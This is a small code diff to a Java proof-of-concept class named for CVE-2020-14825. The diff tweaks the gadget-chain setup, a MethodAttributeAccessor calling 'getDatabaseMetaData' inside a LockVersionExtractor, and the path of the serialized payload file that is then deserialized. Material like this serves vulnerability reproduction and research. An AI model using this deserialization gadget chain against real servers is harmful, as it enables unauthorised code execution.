@@ -13,6 +13,7 @@ public class CVE_2020_14825 {
         accessor.setAttributeName("Timeline Sec");
         accessor.setIsWriteOnly(true);
         accessor.setGetMethodName("getDatabaseMetaData");
+//        accessor.setGetMethodName("connect");
 
         LockVersionExtractor extractor = new LockVersionExtractor(accessor,"");
 
@@ -35,7 +36,7 @@ public class CVE_2020_14825 {
     public static void readObject() {
         FileInputStream fis = null;
         try {
-            fis = new FileInputStream("F:\\java-test\\Mytest\\cve_2020_14825.ser");
+            fis = new FileInputStream(new File("").getAbsolutePath() + "/cve_2020_14825.ser");
             ObjectInputStream ois = new ObjectInputStream(fis);
             ois.readObject();
         } catch (Exception e) {
